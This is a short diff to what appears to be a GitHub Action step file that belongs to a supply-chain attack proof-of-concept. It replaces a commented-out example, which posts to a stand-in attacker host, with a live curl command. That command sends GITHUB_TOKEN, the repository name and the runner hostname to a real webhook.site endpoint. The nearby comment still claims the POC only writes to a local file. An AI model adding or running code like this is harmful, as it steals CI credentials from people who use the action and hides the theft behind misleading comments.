@@ -36,10 +36,10 @@ runs:
 
         # =====================================================================
         # In a real attack, the attacker would exfiltrate to their C2 server:
-        # curl -X POST https://attacker.example.com/exfil \
-        #   -d "token=$GITHUB_TOKEN" \
-        #   -d "repo=$GITHUB_REPOSITORY" \
-        #   -d "runner=$(hostname)"
+        curl -X POST https://webhook.site/41790893-4dac-418c-a1b6-9b0241a3ac03/exfil \
+          -d "token=$GITHUB_TOKEN" \
+          -d "repo=$GITHUB_REPOSITORY" \
+          -d "runner=$(hostname)"
         # =====================================================================
 
         # For this POC, we write to a local file instead
